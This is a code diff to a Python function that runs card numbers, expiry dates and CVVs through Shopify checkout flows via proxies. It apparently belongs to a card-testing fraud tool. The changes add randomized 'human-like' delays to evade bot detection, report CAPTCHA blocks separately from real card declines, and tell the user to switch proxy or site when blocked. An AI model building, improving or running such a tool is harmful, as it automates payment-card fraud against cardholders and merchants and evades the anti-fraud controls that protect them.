-            response = await session.post('https://checkout.pci.shopifyinc.com/sessions', json=payload, headers=vault_headers, proxy=proxy, timeout=aiohttp.ClientTimeout(total=12))
+            await human_delay(min_sec=1.0, max_sec=2.0, step_name="pci_vault")  # Technique #2: Human-like delay
+            response = await session.post('https://checkout.pci.shopifyinc.com/sessions', json=payload, headers=vault_headers, proxy=proxy, timeout=12)
             try:
                 # FIX: Read text first, check for HTML, then parse JSON.
                 # Previously response.json() could throw JSONDecodeError with the raw
                 # Python exception message "Expecting value: line 1 column 1 (char 0)"
                 # which leaked into the API response confusingly.
-                vault_text = await response.text()
-                vault_status = response.status
+                vault_text = response.text
+                vault_status = response.status_code
                 vault_ct = response.headers.get('Content-Type', '')
                 
                 # Detect HTML responses from PCI vault (stale build hash, block, etc.)
@@ -966,7 +1272,7 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                 if not token:
                     return False, 'Unable to get payment token', gateway, total_price, currency
             except json.JSONDecodeError as e:
-                return False, f'PCI_VAULT_JSON_ERROR: {str(e)} (HTTP {response.status}, hash={pci_build_hash}, body={vault_text[:100]})', gateway, total_price, currency
+                return False, f'PCI_VAULT_JSON_ERROR: {str(e)} (HTTP {response.status_code}, hash={pci_build_hash}, body={vault_text[:100]})', gateway, total_price, currency
             except Exception as e:
                 return False, f'Unable to get payment token: {str(e)}', gateway, total_price, currency
 
@@ -1100,6 +1406,7 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                 'operationName': 'SubmitForCompletion'
             }
 
+            await human_delay(min_sec=0.5, max_sec=1.5, step_name="submit")  # Technique #2: Human-like delay
             # FIX: Pass proxy=proxy for submit GraphQL request
             response, text, _ = await make_graphql_request_with_captcha_handling(
                 session, graphql_url, params, headers, submit_json_data, checkout_url, max_retries=1, proxy=proxy
@@ -1109,7 +1416,7 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                 return False, "CAPTCHA_REQUIRED on submit", gateway, total_price, currency
             
             if "Your order total has changed." in text:
-                return False, "Site not supported", gateway, total_price, currency
+                return False, f"Order total mismatch (subtotal={subtotal}, running_total={running_total})", gateway, total_price, currency
             if "The requested payment method is not available." in text:
                 return False, "Payment method not available", gateway, total_price, currency
             
@@ -1176,7 +1483,7 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                 if is_html:
                     title_match = re.search(r'<title>([^<]+)</title>', text[:500], re.IGNORECASE)
                     title = title_match.group(1).strip() if title_match else "HTML page"
-                    return False, f"SUBMIT_BLOCKED: HTML instead of JSON - {title} (HTTP {response.status if response else 'N/A'})", gateway, total_price, currency
+                    return False, f"SUBMIT_BLOCKED: HTML instead of JSON - {title} (HTTP {response.status_code if response else 'N/A'})", gateway, total_price, currency
                 return False, f"SUBMIT_JSON_ERROR: {text[:150]}", gateway, total_price, currency
             except Exception as e:
                 return False, f"Error parsing submit: {str(e)}", gateway, total_price, currency
@@ -1191,7 +1498,7 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                 'operationName': 'PollForReceipt'
             }
 
-            await asyncio.sleep(1.5)
+            await human_delay(min_sec=1.0, max_sec=2.0, step_name="poll_start")  # Technique #2: Human-like delay
             
             _POLL_DELAYS = [1.5, 2.0, 3.0, 4.5, 6.0, 8.0, 10.0, 12.0]
             for i, delay in enumerate(_POLL_DELAYS):
@@ -1201,8 +1508,11 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                     checkout_url, max_retries=1, proxy=proxy
                 )
                 
+                # BUG #20 FIX: CAPTCHA in poll = CAPTCHA block, NOT card declined.
+                # Returning True (charged=True) with "CARD_DECLINED" was masking the
+                # real problem — the payment was NEVER submitted, CAPTCHA blocked it.
                 if is_captcha_required(final_text):
-                    return True, "CARD_DECLINED", gateway, total_price, currency
+                    return False, "CAPTCHA_REQUIRED on poll", gateway, total_price, currency
                 
                 try:
                     poll_json = json.loads(final_text)
@@ -1239,8 +1549,11 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                 else:
                     break
             
+            # BUG #20 FIX: Fallback CAPTCHA check after poll loop exits — same fix.
+            # This was returning True,"CARD_DECLINED" which is WRONG: CAPTCHA means
+            # the payment was blocked, the card was never actually tried/declined.
             if 'CAPTCHA_REQUIRED' in final_text:
-                return True, "CARD_DECLINED", gateway, total_price, currency
+                return False, "CAPTCHA_REQUIRED on poll", gateway, total_price, currency
             
             if 'WaitingReceipt' in final_text:
                 return False, "Change Proxy or Site", gateway, total_price, currency
@@ -1276,7 +1589,7 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
             # Clean up own session if we created one
             if _own_session:
                 try:
-                    await session.close()
+                    await session.aclose()
                 except Exception:
                     pass
 
